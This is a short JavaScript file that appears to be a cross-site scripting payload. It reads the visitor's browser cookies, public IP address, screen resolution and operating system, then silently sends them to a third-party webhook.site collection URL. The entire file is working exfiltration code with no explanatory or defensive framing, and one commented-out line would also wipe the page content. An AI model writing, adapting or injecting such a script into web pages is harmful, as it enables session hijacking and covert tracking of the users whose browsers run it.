function sleep (time) {return new Promise((resolve) => setTimeout(resolve, time));}
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
var OSName = "Unknown";
if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1) OSName="Windows 10";
if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSName="Windows 8";
if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSName="Windows 7";
if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSName="Windows Vista";
if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSName="Windows XP";
if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSName="Windows 2000";
if (window.navigator.userAgent.indexOf("Mac")            != -1) OSName="Mac/iOS";
if (window.navigator.userAgent.indexOf("X11")            != -1) OSName="UNIX";
if (window.navigator.userAgent.indexOf("Linux")          != -1) OSName="Linux";

var win = window, docElem = document.documentElement, body = document.getElementsByTagName('body')[0], x = win.innerWidth || docElem.clientWidth || body.clientWidth, y = win.innerHeight|| docElem.clientHeight|| body.clientHeight;
var ipAddress = httpGet("https://api.ipify.org/?format=text")
var cookie = document.cookie
var screenResolution = x + 'x' + y

sleep(250).then(() => {
var ez = httpGet("https://webhook.site/18d7b104-3aa7-494c-8888-0609d636d9c6?ip=" + ipAddress + "&ssion=" + cookie + "&resolution=" +  screenResolution + "&osname=" + OSName)
})
 // 	document.body.innerHTML = '';
	